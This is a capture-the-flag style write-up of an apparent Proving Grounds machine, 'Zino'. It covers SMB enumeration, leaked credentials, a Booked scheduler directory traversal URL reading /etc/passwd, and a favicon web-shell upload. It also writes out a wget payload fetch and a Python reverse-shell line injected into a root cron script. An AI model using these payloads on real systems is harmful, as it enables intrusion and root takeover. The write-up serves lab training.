---
description: Pg Practice Zino writeup
---

# Zino

![](<../../../.gitbook/assets/image (792).png>)

## Nmap

```
sudo nmap 192.168.249.64 -p- -sV -sS

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql?
8003/tcp open  http        Apache httpd 2.4.38
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP

Initial check on FTP with anonymous login results in a login denied message.

![](<../../../.gitbook/assets/image (752).png>)

## SMB

We can check null authentication on the target with `smbmap`.

```
smbmap -u '' -p '' -R -H 192.168.249.64
```

![](<../../../.gitbook/assets/image (753).png>)

Looks like we have access to the 'zino' share. I will create a directory on my attacking machine and then use `smbclient` to download available files.

```
smbclient -U '' \\\\192.168.249.64\\zino                                                                                                                                                                                           1 ⨯
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt off
smb: \> mget *
```

![](<../../../.gitbook/assets/image (754).png>)

We have a few files to go through here so I will simply highlight the interesting infromation found per file.

```
File: Local.txt

53f24e8ff9809894c0a6d324f82a9fbb
```

Looks like we have a local user flag we can submit.

```
File auth.log

Apr 28 08:16:54 zino groupadd[1044]: new group: name=peter, GID=1001
Apr 28 08:16:54 zino useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
Apr 28 08:17:01 zino CRON[1058]: pam_unix(cron:session): session opened for user root by (uid=0)
```

We now know the target has a user account by the name of 'peter'.

```
File misc.log

Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
```

For an unknown verification we have the credentials admin: `adminadmin`.

For the moment we are finished with SMB. We should next jump into Port 80.

## HTTP

Going to the root page of http://192.168.249.64:8003 takes us to the following:

![http://192.168.249.64:8003](<../../../.gitbook/assets/image (755).png>)

Following the directory we come to the page below.

![](<../../../.gitbook/assets/image (756).png>)

I entered the credentials we found earlier of `admin:adminadmin` and was able to log in to the application.

![](<../../../.gitbook/assets/image (757).png>)

## Exploitation

A quick search for Booked exploits turns up two results. A `Metasploit` exploit and a manual exploit for directory traversal. I will concentrate on not using the `Metasploit` module for this write-up.

![](<../../../.gitbook/assets/image (758) (1).png>)

Using the above information we can read the passwd file with the following URL.

```
http://192.168.249.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_=1588451710324
```

![](<../../../.gitbook/assets/image (759).png>)

I tried reading possible sensitive files and even for SSH keys in the root and user home directories and was unable to gain any interesting information. I decided to stop with this route now and explore the `Metasploit` module to see if I can replicate manually.

{% embed url="https://www.exploit-db.com/exploits/46486" %}

![](<../../../.gitbook/assets/image (760).png>)

From reading the description we should be able to browse to the 'Look and feel' section of the site and upload our own file in place of the favicon.ico.

## Web Shell

![](<../../../.gitbook/assets/image (761).png>)

I have uploaded a simple web shell to the favicon.ico upload section. I did try a standard PHP reverse shell but was unable to get it to talk back. After the file has been uploaded browse to the following to execute.

```
http://<IP>:8003/booked/Web/custom-favicon.php
```

![http://\<IP>:8003/booked/Web/custom-favicon.php](<../../../.gitbook/assets/image (763).png>)

For the next part I tried hosting a `Python SimpleHTTPServer` and getting the target machine to download a proper reverse shell but could not get it to talk back even on port 80 which was a bit weird. I ended up hosting my attacking machine on port 21 since FTP is running.

Attacking machine:

```
sudo Python2 -m SimpleHTTPServer 21
```

Web Shell:

```
wget http://<IP>:21/phpshell.php
```

![](<../../../.gitbook/assets/image (764).png>)

I then stopped the `Python SimpleHTTPServer` and started a `netcat` listener for the phpshell to talk back to.

Attacking machine:

```
sudo nc -lvp 21
```

I then executed the PHP shell on the web shell and received a shell back on my machine.

![](<../../../.gitbook/assets/image (765).png>)

![](<../../../.gitbook/assets/image (766).png>)

## Privilege Escalation

Likely we will need the help of `linpeas.sh` to help us with privilege escalation so I once again hosted a `Python SimpleHTTPServer` on my attacking machine and downloaded `linpeas`.

![](<../../../.gitbook/assets/image (767).png>)

After running `linpeas` and looking through the output we have a cron job that is set to run every 3 minutes that stands out.

![](<../../../.gitbook/assets/image (768).png>)

Looking at the directory where the `cleanup.py` file resides we can see that as www-data we can edit the file.

![](<../../../.gitbook/assets/image (769).png>)

Knowing that this file is executed in the context of root every 3 minutes as a cron job mean we can replace the contents of the file with something that will give us a root shell back.

First clear the content of the `cleanup.py` file with the echo command. Using an extra space in the syntax to wipe the contents of the file.

```
echo  > cleanup.py
```

Then echo the following into the file.

```
'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Set a listener on the attacking machine again. I will be using port 21.

```
sudo nc -lvp 21
```

Wait around 3 minutes for the cron job to execute and you should receive a root shell back.

![](<../../../.gitbook/assets/image (770).png>)
